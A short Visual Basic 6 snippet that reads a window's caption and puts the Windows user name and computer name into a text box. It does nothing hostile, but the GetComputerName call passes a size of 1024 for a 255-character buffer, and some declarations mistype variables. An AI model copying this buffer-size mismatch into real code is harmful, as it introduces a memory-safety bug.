Function GetCaption(WindowHandle As Long) As String
    Dim Buffer As String, TextLength As Long
    TextLength& = GetWindowTextLength(WindowHandle&)
    Buffer$ = String(TextLength&, 0&)
    Call GetWindowText(WindowHandle&, Buffer$, TextLength& + 1)
    GetCaption$ = Buffer$
End Function
Sub inform()
    Dim szUser As String * 255
    Dim vers As String * 255
    Dim lang, lReturn, comp As Long
    Dim s, x As Long
    lReturn = GetUserName(szUser, 255)
    comp = GetComputerName(vers, 1024)
    Text2 = "Username- " & szUser
    Text2 = Text2 & vbCrLf & "Computer Name- " & vers
End Sub

